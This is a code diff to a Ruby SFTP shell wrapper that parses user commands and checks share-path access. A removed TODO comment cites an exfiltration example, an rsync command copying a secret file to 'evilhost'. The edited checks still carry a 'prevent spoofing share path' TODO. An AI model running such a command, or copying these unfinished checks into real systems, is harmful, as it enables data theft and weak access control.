@@ -14,7 +14,8 @@ module SFTPShell
   class Shell
     attr_accessor :config,
                   :logger,
-                  :user
+                  :user,
+                  :share
 
     def initialize(user_id, original_command)
       @user_id = user_id
@@ -33,7 +34,7 @@ module SFTPShell
 
       parse_cmd
       verify_access
-      execute_cmd
+      execute_cmd @original_command
       true
     rescue AccessDeniedError => _
       @logger.warn "Access denied for user #{@user_id}: #{@original_command}"
@@ -61,21 +62,21 @@ module SFTPShell
 
       raise DisallowedCommandError unless ALLOWED_COMMANDS.include? @cmd.first
 
-      # TODO: prevent running rsync client (ssh sftp@myhost 'rsync files/SECRET user@evilhost:SECRET')
-      # TODO: prevent spoofing share path
-      @share_path = File.expand_path File.join @config['storage_path'], @cmd.last
-
+      @share_path = @cmd.last
       @logger.info "Accessing share path #{@share_path}"
     end
 
     def verify_access
-      raise InvalidSharePathError unless @share_path.start_with? @config['storage_path']
+      # TODO: prevent spoofing share path
+      full_path = File.expand_path File.join @config['storage_path'], @share_path
+      raise InvalidSharePathError unless full_path.start_with? @config['storage_path']
 
-      @share = @api.get_share @share_path
+      # TODO: support subdirectory shares
+      @share = API::Share.new @share_path.split(File::SEPARATOR).first
       raise InvalidSharePathError unless @share
 
-      access = @api.check_access @share, @user
-      raise AccessDeniedError unless access
+      access = API::Authorization.new @share.id, @user.id
+      raise AccessDeniedError unless access.authorized
     end
 
     def execute_cmd(*args)
